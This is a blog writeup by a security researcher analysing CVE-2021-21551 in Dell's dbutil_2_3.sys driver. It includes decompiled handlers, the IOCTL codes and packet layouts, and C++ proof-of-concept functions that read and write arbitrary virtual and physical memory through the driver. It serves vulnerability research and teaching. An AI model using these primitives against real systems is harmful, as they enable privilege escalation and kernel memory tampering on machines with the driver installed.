---
slug: 'dbutil'
title: 'CVE-2021-21551: An Extended Writeup on a Vulnerable Kernel Driver'
date: '2021-06-26T23:33:46.730Z'
author: 'Mitch'
---

# Introduction
This is an extended writeup for CVE-2021-21551, a vulnerability related to the *dbutil_2_3.sys* Windows kernel driver from Dell. The original driver was created for performing firmware updates on Dell computers and was deployed on hundreds of millions of computers worldwide. This vulnerability facilitates easy system privilege escalation along with access to physical and kernel memory spaces. Please note that this vulnerability is fairly harmless now that you have to install an older version of the Dell Firmware Update utility, but it is still a great example of why ignoring security in kernel development is a bad idea.
<br/><br/>
While there are already two great writeups about this driver from [Connor McGarr](https://connormcgarr.github.io/cve-2020-21551-sploit/) and [SentinelOne](https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/), I wanted to further analyze this vulnerability myself to learn more about Windows internals, driver reverse engineering, kernel exploitation, and low-level programming. By the end of the project, I discovered two more features of this vulnerability that were not mentioned in either of the aforementioned writeups and developed a cleanly-commented proof-of-concept for the exploit in C++. In this writeup, I will detail the known security flaws of this driver, my new discoveries, and my process of analysis to display the severe security issues that Dell overlooked while designing this driver.

# Beginning the Analysis
When statically analyzing a binary, I usually look at the import list before anything else. It can usually give a fairly decent overview of what the binary is doing (as long as the imports aren't stripped, that is). 
***

![](/blog/dbutil/imports.png)
<p class="caption">The import list for dbutil_2_3.sys</p>

***
Taking a look at the import table for *dbutil_2_3.sys*, the first function that caught my attention was *IoCreateDevice*. The presence of this import indicates that this driver is using IOCTL requests to run its routines. This is great news because bad IOCTL drivers commonly lack security features and can allow any user-mode application to call their routines. My first priority now was to find the IOCTL dispatch function. Taking a look at *DriverInit* (where *IoCreateDevice* is called), it's not too hard to spot it:

```c++
NTSTATUS DriverInit(PDRIVER_OBJECT DriverObject) {
  NTSTATUS result; // eax
  NTSTATUS v3; // ebx
  char *v4; // rbx
  PDEVICE_OBJECT DeviceObject; // [rsp+40h] [rbp-98h] BYREF
  struct _UNICODE_STRING DestinationString; // [rsp+48h] [rbp-90h] BYREF
  struct _UNICODE_STRING SymbolicLinkName; // [rsp+58h] [rbp-80h] BYREF
  WCHAR SourceString[20]; // [rsp+68h] [rbp-70h] BYREF
  WCHAR Dst[24]; // [rsp+90h] [rbp-48h] BYREF

  memmove(SourceString, L"\\Device\\DBUtil_2_3", 0x26ui64);
  memmove(Dst, L"\\DosDevices\\DBUtil_2_3", 0x2Eui64);
  RtlInitUnicodeString(&DestinationString, SourceString);
  RtlInitUnicodeString(&SymbolicLinkName, Dst);
  result = IoCreateDevice(DriverObject, 0xA0u, &DestinationString, 0x9B0Cu, 0, 1u, &DeviceObject);
  if ( !result )
  {
    v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
    if ( v3 )
    {
      IoDeleteDevice(DeviceObject);
      result = v3;
    }
    else
    {
      DriverObject->MajorFunction[16] = (PDRIVER_DISPATCH)&sub_11170;
      DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_11170;
      DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_11170;
      DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_11170;
      v4 = (char *)DeviceObject->DeviceExtension;
      memset(v4, 0, 0xA0ui64);
      *((_QWORD *)v4 + 2) = 0i64;
      KeInitializeDpc((PRKDPC)(v4 + 24), DeferredRoutine, v4);
      KeSetTargetProcessorDpc((PRKDPC)(v4 + 24), 0);
      KeSetImportanceDpc((PRKDPC)(v4 + 24), HighImportance);
      result = 0;
    }
  }
  return result;
}
```
Looking towards the bottom of the function, we can see that *sub_11170* is being used for dispatch. I quickly opened the function in the IDA graph view to get a closer look (and to verify that it actually looks like a dispatcher).
***

![](/blog/dbutil/dispatch_cfg.png)
<p class="caption">Control flow graph for the dispatch function</p>

***
Yep, definitely looks like a dispatcher. This function consists of long *cmp* chains looking to match IOCTL codes to their respective handler. The difficult part came from trying to find the vulnerable handler that grants us full read/write for the virtual kernel memory space.

# Virtual Memory Read/Write
From the [SentinelOne](https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/) writeup, I knew that the function that facilitated this vulnerability was *memmove*, so I decided to look at the cross-references for this function to see if I could find anything. Looking at the xrefs, I saw that *memmove* was being used by these 4 functions: *DriverEntry*, *dispatch*, *sub_151D4*, and *sub_15294*. The first function is the driver initialization function I discussed earlier, so I just skipped over it. The second was one displayed more promise, but it was soon broken. Nothing in the function used *memmove* for anything other than moving byte buffers, so I moved on. The third function seemed great because it's called through the handler, but it ended up being some strange memory allocation routine. The final function, *sub_15294*, ended up being what I was looking for. 
```c++
NTSTATUS virtMemPrimitive(int *DeviceExtension[], bool doRead) {
  unsigned int packetSize; // ecx
  int *packet; // r9
  int *accessAddress; // rax
  unsigned int dataSize; // eax
  void *dstBuffer; // rcx
  const void *srcBuffer; // rdx
  int address; // [rsp+28h] [rbp-20h]
  int offset; // [rsp+30h] [rbp-18h]

  packetSize = *((DWORD *)DeviceExtension + 2);
  if ( packetSize < 0x18 )
    return STATUS_INVALID_PARAMETER;
  packet = *DeviceExtension;
  address = packet[1];
  offset = packet[2];
  dataBuffer = &packet[3];
  accessAddress = DeviceExtension[2];
  if ( accessAddress && accessAddress != (int *)packet[0] )
    return STATUS_ACCESS_VIOLATION;
  dataSize = packetSize - 0x18; // 0x18 is the size of the packet header
  if ( doRead )
  {
    srcBuffer = (const void *)(address + offset); // packet[1] + packet[2] is the pointer to memory that will be read from
    dstBuffer = dataBuffer; // packet[3] will be where the read data will be stored
  }
  else
  {
    srcBuffer = dataBuffer; // packet[3] is where the write data comes from
    dstBuffer = (void *)(address + offset); // packet[1] + packet[2] is where the data will be written
  }
  memmove(dstBuffer, srcBuffer, dataSize);
  return 0;
}
```
Above, you'll find a cleaned-up de-compilation of the virtual memory read/write handler (which I will refer to as *virtMemPrimitive* from now on). This function dissects data from the packet and uses *memmove* to move kernel data to or from the given buffer. That condition comes from the *doRead* boolean passed in as a parameter. This determines if the function performs a read or write on *address*. I was initially confused on whether I could influence the *doRead* parameter inside my IOCTL request, but I found my answer with a quick peek at the *dispatch* function. Here, I inspected the IOCTL codes for the driver and found that *0x9B0C1EC4* sets the *doRead* parameter to *true* while *0x9B0C1EC8* sets the parameter to *false*.
<br/><br/>
Now that I knew how to control the read/write aspect of the virtual memory dispatch handler, I needed to start analyzing the inner workings. It seemed fairly simple; the first 8 bytes aren't utilized for anything important, so I ignored it for now. The second 8 bytes were used as the *address* input which controls the location of the read/write. The third 8 bytes were an address offset; while this seems useful at first, the offset can simply be added to the address before being sent in the packet, so I knew to just pass 0 here in the packet. The last part of the packet was the data buffer which can be any size that we want. The size of this buffer controls the amount of data that will be read or written from the given address. In the proof-of-concepts from [Connor McGarr](https://connormcgarr.github.io/cve-2020-21551-sploit/) and [MetaSploit](https://github.com/rapid7/metasploit-framework/blob/ff2516a7f26460fdbccdb83156d342c6c5c62370/external/source/exploits/CVE-2021-21551/exploit.c#L106), they specify 8 bytes as the maximum size for their virtual memory read/write implementations, while my de-compilation shows that you can provide any size buffer that you want and the driver will read it. This greatly increases the usefulness of the exploit and proves that doing a little more digging into an exploit never hurts.

# Physical Memory Read/Write
Speaking of doing a little more digging, after I was done analyzing the virtual memory routine, there wasn't much more to do with this project. However, since this driver was designed incredibly poorly, I wondered if there was another vulnerability I could find anywhere. I recalled looking at the imports list earlier and seeing the function *MmMapIoSpace*, a WDM function that allows you to map a location in physical memory. I wondered if there was any way to call this function through the IOCTL dispatch, so I got to work looking at the xrefs for this function. *MmMapIoSpace* was only being used by one function: *sub_15100*.

```c++
void physMemPrimitive(int *DeviceExtension[], bool doRead) {
  unsigned int packetSize; // ecx
  int *accessAddress; // rax
  int *packet; // xmm6
  size_t sizeOfData; // rbp
  void *dstBuffer; // rsi
  int physicalAddress; // rax
  void *map; // rax

  packetSize = *((_DWORD *)DeviceExtension + 2);
  if ( packetSize >= 0x10 )
  {
    accessAddress = DeviceExtension[2];
    packet = *DeviceExtension;
    if ( !accessAddress || accessAddress == (int *)packet[0] )
    {
      sizeOfData = packetSize - 0x10; // packet size is only 0x10 here
      dstBuffer = &packet[2];
      physicalAddress = packet[1]; // this is where the physical address gets put into the physicalAddress variable
      map = MmMapIoSpace((PHYSICAL_ADDRESS)physicalAddress, sizeOfData, MmNonCached);// this is where the physical address gets put into the physicalAddress variable// this is where the physical address gets put into the physicalAddress variable
      if ( map )
      {
        if ( doRead )
        {
          qmemcpy(dstBuffer, map, sizeOfData);
        }
        else
        {
          qmemcpy(map, dstBuffer, sizeOfData);
        }
        MmUnmapIoSpace(map, sizeOfData);
      }
    }
  }
}
```

This function does exactly what I hoped it would, and even better, it had an xref in the *dispatch* function, meaning it could likely be called through an IOCTL code. Turns out it could! It takes a physical address we pass in through the IOCTL packet, maps the physical memory space, performs a read/write on the map, and then unmaps the memory. It uses a similar boolean parameter that *virtMemPrimitive* used to control the read/write except the IOCTL code is *0x9B0C1F40* for read and *0x9B0C1F44* for write. Another interesting difference from the virtual memory handler is the packet header size. If you remember, the virtual memory header was *0x18* bytes in size (*[junk value, address, offset]*) while the packet header for this handler is only *0x10* bytes (*[junk value, address]*). I have no idea why Dell's engineers only implemented the offset feature for virtual memory read/writes, but they did. 
<br /><br />
While physical memory access is less useful on more recent versions of Windows 10 due to stronger internal protections, it is still fully exploitable on older versions of Windows (and even earlier versions of Windows 10). Here, physical memory access can give you full access to the virtual memory space of every process and service on the system. Full physical memory access adds a whole other aspect to this vulnerability and I'm surprised that nobody else talked about this feature in their writeup (as far as I know).

# Exploitation and Proof-of-Concept
Now that I had a decent understanding of the inner-workings of this vulnerable driver, it was time to actually develop a proof-of-concept exploit. I decided on C++ because it has easy access to the Win32 API and because I really wanted to get some more practice with the language. The first thing I needed to do was create a handle to the driver device. After I do that, I can communicate with the driver and call the vulnerable routines from the IOCTL dispatcher. To take full advantage of C++, I decided to implement this functionality in the constructor of my *Memory* class.

```c++
Memory::Memory() {
	/* Constructor for Memory Manager */
	// Opens a handle to dbutil_2_3
	Memory::DriverHandle = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	// Checks if handle was opened succesfully
	if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
		Logger::Error("Couldn't Create Handle to Driver, Quitting...");
		Logger::ShowKeyPress();
		exit(1);
	}
	else {
		Logger::Info("Successfully Created Handle to Driver!");
	}
}
```

Going over the implementation, I get a handle to the driver device with *CreateFile* and store it in the class variable *HANDLE DriverHandle*. After this, I do a quick check to make sure that the handle was created properly. If it wasn't, it means that the driver is not running or installed at all. 
<br /><br />
Also, since I haven't talked about it yet, the *Logger* class implements static methods that are basically wrappers around *std::out*. I created this utility class simply as an ease-of-development and because it looks great.

```c++
// IOCTRL Codes for dbutil Driver Dispatch Methods
#define IOCTL_VIRTUAL_READ		      0x9B0C1EC4
#define IOCTL_VIRTUAL_WRITE	        0x9B0C1EC8
#define IOCTL_PHYSICAL_READ		      0x9B0C1F40
#define IOCTL_PHYSICAL_WRITE	      0x9B0C1F44

// Size of the parameters/header of each IOCTRL packet/buffer
#define VIRTUAL_PACKET_HEADER_SIZE	0x18
#define PHYSICAL_PACKET_HEADER_SIZE	0x10
#define PARAMETER_SIZE				      0x8
#define GARBAGE_VALUE				        0xDEADBEEF

BOOL Memory::VirtualRead(_In_ DWORD64 address, _Out_ void *buffer, _In_ size_t bytesToRead) {
	/* Reads VIRTUAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = VIRTUAL_PACKET_HEADER_SIZE + bytesToRead;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, 0x8);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, 0x8);
	// Copies the offset value to the third 8 bytes (offset bytes, added to address inside driver)
	DWORD64 offset = 0x0;
	memcpy(&tempBuffer[0x10], &offset, 0x8);
	// Sends the IOCTL_READ code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_VIRTUAL_READ, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Copies the returned value to the output buffer
	memcpy(buffer, &tempBuffer[0x18], bytesToRead);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}
```

After finishing the initialization code, I decided to start implementing the methods that send the IOCTL packet to the driver and give us access to the vulnerable handlers. Above, I've put an example of one of these methods along with the pre-processor defines from *memory.h*. These are some of the important constants that we discovered through the initial analysis and are re-used throughout most of the methods in the *Memory* class. 

```c++
BOOL Memory::PhysicalWrite(_In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite) {
	/* Reads PHYSICAL memory at the given address */
	// Creates a BYTE buffer to send to the driver
	const DWORD sizeOfPacket = PHYSICAL_PACKET_HEADER_SIZE + bytesToWrite;
	BYTE* tempBuffer = new BYTE[sizeOfPacket];
	// Copies a garbage value to the first 8 bytes, not used
	DWORD64 garbage = GARBAGE_VALUE;
	memcpy(tempBuffer, &garbage, PARAMETER_SIZE);
	// Copies the address to the second 8 bytes
	memcpy(&tempBuffer[0x8], &address, PARAMETER_SIZE);
	// Copies the write data to the end of the header
	memcpy(&tempBuffer[0x10], buffer, bytesToWrite);
	// Sends the IOCTL_WRITE code to the driver with the buffer
	DWORD bytesReturned = 0;
	BOOL response = DeviceIoControl(Memory::DriverHandle, IOCTL_PHYSICAL_WRITE, tempBuffer, sizeOfPacket, tempBuffer, sizeOfPacket, &bytesReturned, NULL);
	// Deletes the dynamically allocated buffer
	delete[] tempBuffer;
	// Returns with the response
	return response;
}
```

Above is another example of one of the handler methods except this one is using the write IOCTL code. This one is also for the physical memory handler instead of the virtual one. You can see that it is fairly similar except we put the data we want to write into the buffer before sending it instead of sending a blank buffer. It's the same packet, just different functionality. Of course, there are two other handler methods in the source named *PhysicalRead* and *VirtualWrite* that we didn't talk about, but I'm sure you can imagine what those look like (and if not, I'll link the source soon). 



# Conclusion
This vulnerability is a great practice tool for kernel exploitation due to its simplicity and how fun it is to reverse. It can even be used to experiment with other kernel exploits due to the seamless access it provides to the virtual kernel memory space. And even better, if you're on an older version of Windows, you can have full access to user-mode virtual memory spaces as well.
<br /><br /> 
As I mentioned earlier, this exploit is fairly harmless in the wild, but it is still enough of a concern where you would think that Dell would revoke the drivers certificate. Unfortunately, they haven't. You can still install this vulnerable driver on the latest version of Windows with no problems (don't do that though). Hopefully this writeup will be the final nail in the coffin for this horribly-written driver. 🙂